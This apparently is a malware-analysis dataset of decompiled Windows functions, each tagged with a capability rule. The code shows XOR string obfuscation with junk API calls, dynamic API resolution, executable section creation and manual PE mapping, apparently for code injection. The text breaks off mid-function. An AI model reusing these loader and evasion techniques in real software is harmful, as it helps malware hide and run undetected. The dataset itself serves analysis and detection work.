{
    "00401556": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401556(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = *0x41dacc;\n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.00401000(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(uVar3);\n        var_14h = iVar2;\n        var_10h = fcn.00404549();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x363a754b;\n            var_28h = 0x5313653c;\n            var_24h._0_2_ = 0x5236;\n            var_20h = 0x36537565;\n            var_1ch._0_1_ = 0x52;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0xee248e) {\n                    var_ch = 5;\n                    *(iVar8 + piVar4) = *(&var_20h + iVar8 % 5) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.0040c7ca(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.0040110c();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 827
    },
    "004016a0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004016a0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0e380d;\n    var_20h = 0x20071c21;\n    var_4h = 6;\n    var_1ch._0_1_ = 6;\n    var_1ch._1_1_ = 99;\n    var_18h = 0x636a4c63;\n    var_14h._0_2_ = 0x324d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0xd3f2113;\n    var_38h = 0x34352026;\n    var_34h = 0x27213627;\n    var_30h = 0x303c112e;\n    var_2ch = 0x3a330117;\n    var_28h._0_2_ = 0x4321;\n    var_18h = 0x43535541;\n    var_14h._0_2_ = 0x7352;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xb3b941) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 891
    },
    "004017d6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004017d6(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0e380d;\n    var_20h = 0x20071c21;\n    var_4h = 6;\n    var_1ch._0_2_ = 0x6306;\n    var_18h = 0x636a4c63;\n    var_14h._0_2_ = 0x324d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_24h = 0x35363811;\n    var_20h = 0x2327000f;\n    var_1ch._0_2_ = 0x6737;\n    var_18h = 0x675a4c43;\n    var_14h._0_2_ = 0x6e6e;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x1ed160) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 797
    },
    "004018f7": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004018f7(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x39073902;\n    var_38h = 0x2f241a34;\n    var_34h = 0x1e2a0b2f;\n    var_30h = 0x25303b2f;\n    var_2ch._0_2_ = 0x2422;\n    var_2ch._2_1_ = 0x58;\n    var_20h = 0x584a4d4c;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x44);\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar2 != 0x7220f9) {\n            var_4h = 5;\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % 5) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_34h = 0xf0e380d;\n    var_30h = 0x20071c21;\n    var_4h = 6;\n    var_2ch._0_2_ = 0x6306;\n    var_20h = 0x636a4c63;\n    var_1ch._0_2_ = 0x324d;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar2 = var_ch;\n        if (iVar3 != 0x2501ed) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.004016a0();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1047
    },
    "00401a5e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401a5e(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0e380d;\n    var_20h = 0x20071c21;\n    var_4h = 6;\n    var_1ch._0_1_ = 6;\n    var_1ch._1_1_ = 99;\n    var_18h = 0x636a4c63;\n    var_14h._0_2_ = 0x324d;\n    var_10h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x1c234c03;\n    var_38h = 0x6e3d5339;\n    var_34h = 0x7d23171f;\n    var_30h = 0x11136b2b;\n    var_2ch = 0x56225b20;\n    var_28h._0_1_ = 0x76;\n    var_18h = 0x7276384d;\n    var_14h._0_2_ = 0x3254;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x4c0b17) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_10h);\n    uVar1 = fcn.004016a0();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 934
    },
    "00401b9b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401b9b(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    puVar7 = &var_54h;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_2ch;\n    var_1ch = in_EDX;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_38h = 0xf0e380d;\n    var_34h = 0x20071c21;\n    var_10h = 6;\n    var_30h = var_30h & 0xffff0000 | 0x6306;\n    var_24h = 0x636a4c63;\n    var_20h._0_2_ = 0x324d;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x2a110309;\n    var_38h = 0x1233163c;\n    var_34h = 0x33a3d01;\n    var_30h = 0x583c182e;\n    var_24h = 0x58527747;\n    var_20h._0_2_ = 0x7759;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_18h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0xeda34c) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.004016a0();\n    }\n    else {\n        iVar6 = fcn.004018f7(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1390
    },
    "00401d7a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401d7a(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1191
    },
    "004029e5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004029e5(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_2ch = param_1;\n    if ((((*0x41da94 | *0x41da98) == 0) || ((*0x41da9c | *0x41daa0) == 0)) || ((*0x41daa4 | *0x41daa8) == 0)) {\n        var_4h = 0x7f;\n        var_38h = 0xf0e380d;\n        var_34h = 0x20071c21;\n        var_1ch = 6;\n        var_30h._0_2_ = 0x6306;\n        var_28h = 0x636a4c63;\n        var_24h._0_2_ = 0x324d;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar3 != 0x2501ed) {\n                *(iVar6 + iVar2) = *(&var_28h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[&var_38h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_ch = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_ch == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_38h = 0x75072a3f;\n        var_34h = 0x312a1222;\n        var_30h._0_2_ = 0x2155;\n        var_30h._2_1_ = 0x73;\n        var_28h = 0x39754e73;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x4d);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_20h = 5;\n        iVar6 = 0;\n        var_14h = iVar2;\n        var_8h = &var_38h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            if (iVar3 != 0xebd747) {\n                *(iVar6 + iVar2) = *(&var_28h + iVar6 % var_20h) ^ (iVar6 + iVar2)[&var_38h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xb);\n        *0x41da94 = fcn.00409be5();\n        iVar6 = var_10h;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41da98 = *0x41da94 >> 0x1f;\n        if ((*0x41da94 | *0x41da98) == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_50h = 0x32370304;\n            var_4ch = 0x15183d37;\n            var_48h = 0x2d37162a;\n            var_44h = 0x3420153d;\n            var_40h = 0x23a2d36;\n            var_3ch._0_2_ = 0x636;\n            var_3ch._2_1_ = 0x52;\n            var_34h = 0x75456748;\n            var_30h._0_2_ = 0x4952;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_28h = &var_50h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n                if (iVar3 != 0xdb790d) {\n                    *(iVar6 + iVar2) = *(&var_34h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[&var_50h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41da9c = fcn.00409be5();\n            iVar6 = var_10h;\n            iVar2 = var_14h;\n            *0x41daa0 = *0x41da9c >> 0x1f;\n            if ((*0x41da9c | *0x41daa0) == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar4)(uVar1);\n                uVar1 = (*pcVar7)(0, iVar6);\n                (*pcVar4)(uVar1);\n                return var_4h;\n            }\n            var_50h = 0x31233909;\n            var_4ch = 0x102b270c;\n            var_48h = 0x3c3a3537;\n            var_44h = 0x3f023607;\n            var_40h = 0xc2e1603;\n            var_3ch._0_2_ = 0x3721;\n            var_3ch._2_1_ = 0x73;\n            var_1ch = 0x43734e53;\n            var_18h._0_1_ = 99;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_28h = &var_50h - iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetInputState)();\n                if (iVar3 != 0x8b8068) {\n                    *(iVar6 + iVar2) = *(&var_1ch + iVar6 % var_20h) ^ (iVar6 + iVar2)[&var_50h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41daa4 = fcn.00409be5();\n            iVar6 = var_10h;\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x41daa8 = *0x41daa4 >> 0x1f;\n            if ((*0x41daa4 | 